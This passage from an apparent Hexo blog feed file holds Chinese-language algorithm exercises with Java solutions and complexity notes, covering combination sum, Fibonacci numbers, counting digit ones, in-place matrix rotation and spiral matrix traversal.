operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>      elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">combSumSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T: O(1)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n^(target/min)), Space: O(target/min)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">combinationSumSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> candidates<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Arrays<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">combSumSort</span><span class="token punctuation">(</span>candidates<span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第 n 个斐波那契数</title>
      <link href="/2019/02/17/suan-fa/di-n-ge-fei-bo-na-qi-shu/"/>
      <url>/2019/02/17/suan-fa/di-n-ge-fei-bo-na-qi-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="第-n-个斐波那契数"><a href="#第-n-个斐波那契数" class="headerlink" title="第 n 个斐波那契数"></a>第 n 个斐波那契数</h1><p><strong>题目描述</strong><br>这个题目说的是，给你一个非负整数 n，你要写一个函数返回第 n 个斐波那契数。其中斐波那契数列最开始的两项是 0 和 1，后面任意一项都是它前面两个数字之和。</p><pre><code>比如说，你写的函数是 f，那么就有：f(0) = 0,f(1) = 1,f(2) = 0 + 1 = 1,f(3) = 1 + 1 = 2,f(4) = 1 + 2 = 3,f(5) = 2 + 3 = 5,...以此类推。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(2^n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">fibRecursive</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">fibRecursive</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">fibRecursive</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">fibIterative</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> d<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> d<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> d<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">fibIterativeO1</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> first <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> second <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> third <span class="token operator">=</span> first <span class="token operator">+</span> second<span class="token punctuation">;</span>      first <span class="token operator">=</span> second<span class="token punctuation">;</span>      second <span class="token operator">=</span> third<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> second<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数 1 到 n 中 1 出现的次数</title>
      <link href="/2019/02/17/suan-fa/zheng-shu-1-dao-n-zhong-1-chu-xian-de-ci-shu/"/>
      <url>/2019/02/17/suan-fa/zheng-shu-1-dao-n-zhong-1-chu-xian-de-ci-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="整数-1-到-n-中-1-出现的次数"><a href="#整数-1-到-n-中-1-出现的次数" class="headerlink" title="整数 1 到 n 中 1 出现的次数"></a>整数 1 到 n 中 1 出现的次数</h1><p><strong>题目描述</strong><br>这个题目说的是，给你一个整数 n，你要计算出 1 到 n 这 n 个整数中，数字 1 出现的次数。</p><pre><code>比如说，给你的整数 n 等于 12：n = 121 到 12 中包含数字 1 的整数有：1, 10, 11, 12这里面数字 1 出现了 5 次，因此你要返回 5。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n*log10(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">countDigitOneBruteForce</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> num <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>num <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">++</span>count<span class="token punctuation">;</span>        num <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> count<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(log10(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">countDigitOneMath</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> factor <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">/</span> factor <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">long</span> digit <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">/</span> factor<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>      <span class="token keyword">long</span> high <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">*</span> factor<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>digit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        count <span class="token operator">+=</span> high <span class="token operator">*</span> factor<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>digit <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        count <span class="token operator">+=</span> high <span class="token operator">*</span> factor<span class="token punctuation">;</span>        count <span class="token operator">+=</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> factor<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        count <span class="token operator">+=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      factor <span class="token operator">=</span> factor <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>count<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋转二维数组</title>
      <link href="/2019/02/17/suan-fa/xuan-zhuan-er-wei-shu-zu/"/>
      <url>/2019/02/17/suan-fa/xuan-zhuan-er-wei-shu-zu/</url>
      
        <content type="html"><![CDATA[<h1 id="旋转二维数组"><a href="#旋转二维数组" class="headerlink" title="旋转二维数组"></a>旋转二维数组</h1><p><strong>题目描述</strong><br>这个题目说的是，给你一个 n x n 的二维数组，你要沿顺时针方向将它旋转 90 度。要求你不能使用额外的存储空间，就地在原数组操作。</p><pre><code>比如说，给你的二维数组是：1, 2, 34, 5, 67, 8, 9顺时针旋转 90 度后，得到的二维数组是：7, 4, 18, 5, 29, 6, 3</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n^2), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span>      matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>按照顺时针的顺序，逐层遍历并打印N阶方阵</title>
      <link href="/2019/02/15/suan-fa/an-zhao-shun-shi-zhen-de-shun-xu-zhu-ceng-bian-li-bing-da-yin-n-jie-fang-zhen/"/>
      <url>/2019/02/15/suan-fa/an-zhao-shun-shi-zhen-de-shun-xu-zhu-ceng-bian-li-bing-da-yin-n-jie-fang-zhen/</url>
      
        <content type="html"><![CDATA[<h2 id="按照顺时针的顺序，逐层遍历并打印N阶方阵"><a href="#按照顺时针的顺序，逐层遍历并打印N阶方阵" class="headerlink" title="按照顺时针的顺序，逐层遍历并打印N阶方阵"></a>按照顺时针的顺序，逐层遍历并打印N阶方阵</h2><p><strong>问题</strong></p><p>逆时针打印矩阵，输入一个矩阵，按照从外向里逆时针的顺序打印出每一个数字。</p><pre class=" language-markdown"><code class="language-markdown">输入：1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16输出：1 2 3 4 8 12 16 15 14 13 9 5 6 7 11 10 </code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyReversePrint</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span>                <span class="token punctuation">{</span>                        <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token punctuation">{</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">;</span>        ArrayList<span class="token operator">&lt;</span>Integer<span class="token operator">></span> printList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        printList <span class="token operator">=</span> <span class="token function">reversePrint</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>        printList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>x <span class="token operator">-</span><span class="token operator">></span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> ArrayList<span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token function">reversePrint</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 二位数组（矩阵）的行数</span>        <span class="token keyword">int</span> rows <span class="token operator">=</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 二位数组（矩阵）的列数</span>        <span class="token keyword">int</span> columns <span class="token operator">=</span> array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>        ArrayList<span class="token operator">&lt;</span>Integer<span class="token operator">></span> myList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// start表示圈数，从第0圈开始计数，没走一圈 圈数+1</span>        <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//让循环继续进行的条件是:矩阵的行数>当前的圈数×２且同时要满足矩阵的列数>当前的圈数×２.</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>rows <span class="token operator">></span> start <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> columns <span class="token operator">></span> start <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//记录每圈最后一行的下标</span>            <span class="token keyword">int</span> endRow <span class="token operator">=</span> rows <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> start<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//记录没圈最后一列的下标</span>            <span class="token keyword">int</span> endColumn <span class="token operator">=</span> columns <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> start<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//一圈圈逆序遍历数组中的元素，并插入到myList中</span>            <span class="token comment" spellcheck="true">//1.从左到右</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> endColumn<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                myList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2.从上到下</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>endRow <span class="token operator">></span> start<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> endRow<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                    myList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>endColumn<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//3.从右到左</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>endRow <span class="token operator">></span> start <span class="token operator">&amp;&amp;</span> endColumn <span class="token operator">></span> start<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> endColumn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> start<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>                    myList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>endRow<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//4.从下到上</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>endRow <span class="token operator">>=</span> start <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> endColumn <span class="token operator">></span> start<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> endRow <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> start<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>                    myList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//圈数自增</span>            start<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> myList<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>青蛙跳台阶一阶、两阶，求n阶的台阶一共几种跳法</title>
      <link href="/2019/02/15/suan-fa/qing-wa-tiao-tai-jie-yi-jie-liang-jie-qiu-n-jie-de-tai-jie-yi-gong-ji-chong-tiao-fa/"/>
      <url>/2019/02/15/suan-fa/qing-wa-tiao-tai-jie-yi-jie-liang-jie-qiu-n-jie-de-tai-jie-yi-gong-ji-chong-tiao-fa/</url>
      
